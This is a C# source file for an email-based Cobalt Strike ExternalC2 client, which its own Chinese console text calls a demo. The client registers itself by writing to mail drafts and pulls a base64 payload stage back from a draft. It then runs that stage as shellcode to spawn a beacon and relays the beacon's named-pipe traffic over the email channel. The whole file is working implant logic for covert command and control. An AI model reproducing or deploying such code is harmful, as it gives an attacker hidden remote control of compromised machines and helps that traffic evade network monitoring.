using System;
using System.Linq;
using System.Text;
using System.Threading;

namespace SharpEmailC2
{
    class Program
    {
        public static bool isFirstLoop = true;
        public static Byte[] SendData_Pack(String data)
        {
            var DataBytes = Encoding.UTF8.GetBytes(data);
            Console.WriteLine("  [>] SendData_Pack: {0}", DataBytes.Length);
            return DataBytes;
        }

        public static string uuid()
        {
            // 生成一个新的UUID
            Guid uuid = Guid.NewGuid();
            // 将UUID转换为字符串表示形式
            string uuidString = uuid.ToString();
            return uuidString;
        }


        static void Main(string[] args)
        {
            Console.WriteLine("[+] 基于 Email 的 CobaltStrike ExternalC2 的 Demo 演示.");

            //bool is64Os = Environment.Is64BitOperatingSystem;
            //只考虑64位系统
            string Os = "x64";
            string PipeName = "testpipe";
            string UUID = uuid();

            Console.WriteLine("[+] 配置信息如下:");
            Console.WriteLine("  [>] 架构为: {0}", Os);
            Console.WriteLine("  [>] 管道名为: {0}", PipeName);
            Console.WriteLine("[+] 获取到uuid:{0}", UUID);
            Console.WriteLine("[+] 发送邮件请求 Payload Stage");


            // 以下接口分别为运行shellcode，命名管道的连接与读写。
            ISpawnBeacon spawn = new spawnBeacon();
            IConnectBeaconPipe pipeName = new pipeOptions();

            int maxRetries = 50; // 最大重试次数
            int retryCount = 0; // 当前重试次数
            byte[] rs = null;

            //发送client信息
            while (retryCount < maxRetries)
            {
                try
                {
                    DraftsIO.Write("client", Os + "." + UUID + "." + PipeName, 0);
                    break;
                }
                catch (Exception e)
                {
                    // 在catch块中捕获异常
                    // 可以在这里记录日志或执行其他处理逻辑

                    retryCount++;

                    if (retryCount >= maxRetries)
                    {

                        Console.WriteLine("[!] Error: {0}", e.Message);
                    }
                    //throw;
                    Console.WriteLine("[!] 发送client信息重试" + retryCount);
                    // 等待一段时间后继续重试
                    Thread.Sleep(1000); // 可以根据需要调整等待时间
                }
            }


            //获取Payload
            Thread.Sleep(3000);
            while (retryCount < maxRetries)
            {
                try
                {
                    string rs1 = DraftsIO.Read("ts" + UUID);
                    if (rs1.Length > 10000)
                    {
                        rs = Convert.FromBase64String(rs1);
                        break;
                    }
                }
                catch (Exception e)
                {
                    // 在catch块中捕获异常
                    // 可以在这里记录日志或执行其他处理逻辑

                    retryCount++;

                    if (retryCount >= maxRetries)
                    {
                        Console.WriteLine("[!] Error: {0}", e.Message);
                    }
                    Console.WriteLine("[!] 获取Payload重试" + retryCount);
                    // 等待一段时间后继续重试
                    Thread.Sleep(1000); // 可以根据需要调整等待时间
                }
            }


            while (retryCount < maxRetries)
            {
                //执行shellcode
                while (retryCount < maxRetries)
                {
                    try
                    {
                        Thread thread = new Thread(() => spawn.SpawnBeacon(rs));
                        thread.Start();
                        break;

                    }
                    catch (Exception e)
                    {
                        // 在catch块中捕获异常
                        // 可以在这里记录日志或执行其他处理逻辑

                        retryCount++;

                        if (retryCount >= maxRetries)
                        {
                            // 达到最大重试次数，无法继续重试，抛出异常
                            //throw;
                            Console.WriteLine("[!] Error: {0}", e.Message);
                        }
                        Console.WriteLine("[!] 执行Beacon重试" + retryCount);
                        // 等待一段时间后继续重试
                        Thread.Sleep(1000); // 可以根据需要调整等待时间

                    }
                }
                Thread.Sleep(3000);

                //定义flag，使其在第一次新建草稿，后面的循环都只修改同一封草稿
                int code = 1;
                //管道与ts交互处理
                while (retryCount < maxRetries)
                {
                    try
                    {
                        pipeName.ConnectBeaconPipe(PipeName, UUID, code);
                        break;

                    }
                    catch (Exception e)
                    {
                        // 在catch块中捕获异常
                        // 可以在这里记录日志或执行其他处理逻辑

                        retryCount++;

                        if (retryCount >= maxRetries)
                        {
                            // 达到最大重试次数，无法继续重试，抛出异常
                            //throw;
                            Console.WriteLine("[!] Error: {0}", e.Message);
                        }
                        //throw;
                        //一般出现这个问题是由于controller删除邮件的那一瞬间client读取会显示邮件为空，可以无线增加重试次数解决
                        Console.WriteLine("[!] 管道交互处理重试" + retryCount + "" + e.Message);
                        // 等待一段时间后继续重试
                        Thread.Sleep(1000); // 可以根据需要调整等待时间
                    }
                    code = 0;
                }


            }

        }
    }
}